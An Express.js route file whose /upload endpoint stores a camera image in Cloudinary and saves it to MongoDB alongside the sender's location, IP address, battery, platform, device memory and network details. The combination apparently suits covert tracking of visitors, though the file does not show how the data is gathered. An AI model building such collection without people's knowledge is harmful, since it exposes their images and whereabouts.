import express from "express";
import cloudinary from "../config/cloudinary.js";
import UserData from "../models/UserData.js";

const router = express.Router();

// Log incoming requests
router.use((req, res, next) => {
  console.log("Incoming request:", req.method, req.url);
  next();
});

router.post("/upload", async (req, res) => {
  try {
    const { image, metadata } = req.body;

    if (!image) {
      console.log("No image received");
      return res.status(400).json({ error: "No image received" });
    }
    if (!metadata) {
      console.log("No metadata received");
      return res.status(400).json({ error: "No metadata received" });
    }

    // Upload camera image to Cloudinary
    const uploadRes = await cloudinary.uploader.upload(image, { folder: "uploads" });
    console.log("Camera image uploaded:", uploadRes.secure_url);

    // Save metadata + image URL to MongoDB
    const userData = await UserData.create({
      imageUrl: uploadRes.secure_url,
      useragent: metadata.useragent,
      platform: metadata.platform,
      battery: metadata.battery,
      location: metadata.location,
      time: metadata.time,
      ip: metadata.ip,
      deviceMemory: metadata.deviceMemory,
      network: metadata.network
    });

    console.log("Data saved to MongoDB:", userData._id);
    res.json({ success: true, url: uploadRes.secure_url });

  } catch (err) {
    console.error("UPLOAD ERROR:", err);
    res.status(500).json({ success: false, error: err.message });
  }
});

export default router;
